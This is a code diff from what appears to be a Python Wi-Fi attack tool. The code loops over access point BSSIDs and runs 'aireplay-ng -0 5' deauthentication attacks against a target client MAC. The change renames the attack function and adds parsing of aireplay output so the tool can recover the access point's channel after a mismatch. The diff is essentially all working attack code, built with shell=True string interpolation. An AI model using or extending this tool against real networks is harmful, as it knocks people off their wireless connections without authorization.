@@ -105,10 +105,12 @@ class Functs:
                 bssi.append(key)
                 chns.append(value)
             
-            def do_bssid_method(bssid_: str):
+            def ado_bssid_method(bssid_: str):
                 try:
                     out = check_output(f"""aireplay-ng -0 5 -a {bssid_} -c {get_var('target_mac')} {get_var('interface')}""", shell=True)#, stdout=DEVNULL, stderr=STDOUT)
                     print(f"""==============OUTPUT============\n{out.decode()}\n================================""")
+                    if f", but the AP uses channel" in out.decode():
+                        print(f"""=========Trying to get channel============\n{out.decode()[out.decode().find(f"AP uses channel")::]}\n===========================================""")
                 except KeyboardInterrupt:
                     Functs.switch(Interface(get_var('interface')), "managed")
                     return
@@ -116,7 +118,7 @@ class Functs:
                     Functs.BSSID_METHOD.deauth(_bssid=_bssid)
             
             for bssid_aa in bssi:
-                do_bssid_method(bssid_aa)
+                ado_bssid_method(bssid_aa)
             Functs.BSSID_METHOD.deauth(_bssid=_bssid)
 
 
